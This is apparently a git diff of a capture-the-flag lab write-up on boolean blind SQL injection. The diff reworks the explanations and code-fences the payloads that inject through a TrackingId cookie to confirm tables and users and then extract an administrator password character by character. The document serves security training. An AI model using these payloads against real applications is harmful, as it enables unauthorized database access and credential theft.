@@ -54,7 +54,7 @@ Captured the request to identify cookies.
 ![1](Blind_SQLi/1.png)
 
 ➤ **Why?**
-We want the baseline request containing the **TrackingId** parameter.
+This gives us the baseline request so we know exactly where the **TrackingId** parameter is included and how the app behaves.
 
 ---
 
@@ -65,7 +65,7 @@ Repeater helps us manipulate the cookie.
 ![2](Blind_SQLi/2.png)
 
 ➤ **Why?**
-All further logic testing is done in Repeater.
+Repeater allows controlled testing of payloads and observing the presence/absence of **Welcome back**.
 
 ---
 
@@ -76,73 +76,72 @@ Here’s the real request we're testing:
 ![3](Blind_SQLi/3.png)
 
 ➤ **Why?**
-Injection point = **TrackingId=...**
+We confirm the injection point is inside the **TrackingId** cookie which the backend uses in a SQL query.
 
 ---
 
 ## **4. Test Boolean TRUE Condition**
 
-Add:
-
+```
 ' AND '1'='1
+```
 
 ![4](Blind_SQLi/4.png)
 
 ➤ **Why?**
-Presence of **Welcome back** confirms Boolean TRUE.
+This payload injects a tautology that always evaluates TRUE, so the backend returns **Welcome back**, confirming SQL injection works.
 
 ---
 
 ## **5. Test Boolean FALSE Condition**
 
-Payload:
-
+```
 ' AND '1'='2
+```
 
 ![5](Blind_SQLi/5.png)
 
 ➤ **Why?**
-No Welcome back = Boolean FALSE
-This establishes True/False measurement for the entire attack.
+This condition is always FALSE, so **Welcome back** disappears — establishing our TRUE/FALSE detection mechanism.
 
 ---
 
 ## **6. Verify `users` Table Exists**
 
-Payload:
-
+```
 ' AND (SELECT 'a' FROM users LIMIT 1)='a
+```
 
 ![6](Blind_SQLi/6.png)
 
 ➤ **Why?**
-TRUE response confirms table **users** exists.
+If the table `users` exists, the subquery returns `'a'`, making the condition TRUE → Welcome back.
 
 ---
 
 ## **7. Verify Administrator User Exists**
 
-Payload:
-
+```
 ' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+```
 
 ![7](Blind_SQLi/7.png)
 
 ➤ **Why?**
-TRUE → admin user is present.
+If the `administrator` user exists, the subquery returns `'a'`, and we see **Welcome back**, proving the user exists.
 
 ---
 
 ## **8. Determine Password Length**
 
-Payload:
-
+```
 ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+```
 
 ![8](Blind_SQLi/8.png)
 
 ➤ **Why?**
-When the condition becomes FALSE → length found.
+We check increasing lengths. When TRUE → password is longer. When FALSE → we've exceeded its actual length.
 
 ---
 
@@ -155,15 +154,20 @@ Sniper → Payload from **1 to 21**.
 Result:
 Welcome back stops at **20** → Password length = **20**
 
+➤ **Why?**
+Intruder automates LENGTH(password)>X checks to quickly identify the exact size.
+
 ---
 
 ## **10. Character Bruteforce Setup (a-z0-9)**
 
-Community users can generate payload list:
+Generate payload list:
 
 ![10](Blind_SQLi/10.png)
 
-**Python script you provided:**
+BurpSuite Professional has built-in lists having [a-z0-9].
+
+Python script for Community Users to automatically generate the list.
 
 ```
 import os
@@ -188,19 +192,22 @@ print("payload.txt generated successfully!")
 ```
 
 ➤ **Why?**
-This forms the brute-force charset for Intruder.
+This file is used as the Intruder payload list to test each character against the SUBSTRING query.
 
 ---
 
 ## **11. Extract Character at Position 1**
 
-Payload:
-
+```
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+```
 
 ![11](Blind_SQLi/11.png)
 
 Character obtained = **6**
+
+➤ **Why?**
+This tests if position 1 equals a given character. TRUE → Welcome back → we found the correct character.
 
 ---
 
@@ -208,15 +215,22 @@ Character obtained = **6**
 
 Pattern:
 
+```
 ' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
-…
+```
+
+```
 ' AND (SELECT SUBSTRING(password,20,1) FROM users WHERE username='administrator')='a
+```
 
 ![12](Blind_SQLi/12.png)
 
 Final password reconstructed:
 
 **611d1j31f4ynt74wibio**
+
+➤ **Why?**
+Repeating the same boolean check for each index reveals all characters sequentially.
 
 ---
 
@@ -237,18 +251,20 @@ Final password reconstructed:
 * Blind SQL injection relies entirely on **indirect clues**, not errors.
 * Boolean-based attacks require:
 
-  * Reliable TRUE/FALSE reflection
-  * Repeater for small checks
-  * Intruder for large-value brute force
-* SUBSTRING + boolean comparison = full password extraction.
+  * Consistent TRUE/FALSE reflection
+  * Repeater for manual checks
+  * Intruder for automating brute-force
+* SUBSTRING checks allow full password extraction.
 
 ---
 
 # 🔥 Final Thoughts
 
-This lab is the perfect example of how **non-verbose SQLi** can still leak full credentials if boolean conditions are observable. Mastering this technique is crucial for VAPT and real-world pentests where applications hide database errors.
+This lab is the perfect example of how **non-verbose SQLi** still leaks full credentials when an app reflects conditional behaviour.
+Blind SQLi mastery is essential for real-world red teaming and VAPT engagements.
 
 Stay relentless. <br/>
 — **Aditya Bhatt** 🔥
 
 ---
+
